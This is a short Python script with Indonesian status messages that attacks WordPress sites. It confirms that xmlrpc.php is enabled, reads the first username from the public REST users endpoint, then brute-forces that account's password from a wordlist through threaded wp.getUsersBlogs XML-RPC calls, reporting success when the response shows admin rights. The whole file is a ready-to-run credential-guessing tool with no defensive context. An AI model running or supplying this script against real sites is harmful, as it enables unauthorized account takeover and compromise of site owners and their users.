#!/usr/bin/env python3
import requests, sys, threading
from xml.etree import ElementTree

url = sys.argv[1]
wordlist = sys.argv[2]

xmlrpc = url + "/xmlrpc.php"
users_url = url + "/wp-json/wp/v2/users"

r = requests.get(xmlrpc)
if "XML-RPC" not in r.text:
    print("[!] XML-RPC tidak aktif")
    sys.exit(1)

user = requests.get(users_url).json()
if not user or 'slug' not in user[0]:
    print("[!] Tidak bisa ambil username")
    sys.exit(1)

username = user[0]['slug']
print(f"[+] Username: {username}")

with open(wordlist, 'r') as f:
    passwords = [line.strip() for line in f]

found = False
total = len(passwords)

def brute(passw, idx):
    global found
    if found: return
    print(f"[{idx+1}/{total}] Mencoba: {passw}", end="\r")
    data = f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value><string>{username}</string></value></param>
        <param><value><string>{passw}</string></value></param>
      </params>
    </methodCall>"""

    r = requests.post(xmlrpc, data=data)
    if "<name>isAdmin</name>" in r.text:
        found = True
        print(f"\n[+] PASSWORD DITEMUKAN: {passw}")

threads = []
for i, p in enumerate(passwords):
    t = threading.Thread(target=brute, args=(p, i))
    threads.append(t)
    t.start()
    if len(threads) >= 10:
        for t in threads: t.join()
        threads.clear()

for t in threads: t.join()
if not found:
    print("\n[-] Password tidak ditemukan.")